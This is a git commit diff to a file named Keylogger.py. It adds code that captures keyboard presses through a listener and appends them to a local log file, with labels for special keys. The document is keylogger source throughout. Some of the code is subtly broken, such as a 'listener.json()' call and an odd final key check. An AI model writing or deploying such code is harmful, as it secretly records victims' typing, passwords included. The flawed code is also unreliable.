4e688f4a0ae262cedbf71b536c8378df227b5652
RinorMehmeti5 <61470672+RinorMehmeti5@users.noreply.github.com>
2023-01-08 17:08:03 +0100

    Update Keylogger.py

--- Keylogger.py
+++ Keylogger.py
@@ -19,3 +19,32 @@ def on_press(qeles) :
 		numerimi = 0
 		write_file(qelesat)
 		qelesat = []
+
+def write_file(qelesat):
+	with open(path,"a") as file:
+		for qeles in qelesat:
+			k = str(qeles).replace("'","")
+			
+			if k.find('backspace') > 0:
+				file.write(' Backspace ')
+				
+			elif k.find('space') > 0:
+				file.write(' Space ')
+				
+			elif k.find('shift') > 0:
+				file.write(' Shift ')
+				
+			elif k.find('enter') > 0:
+				file.write('\n')
+				
+			elif k.find('caps_lock') > 0:
+				file.write(' Caps_lock ')
+				
+			elif k.find('esc') > 0:
+				return False
+			
+			elif k.find('qeles'):
+				file.write(k)
+				
+with Listener(on_press=on_press) as listener:
+	listener.json()
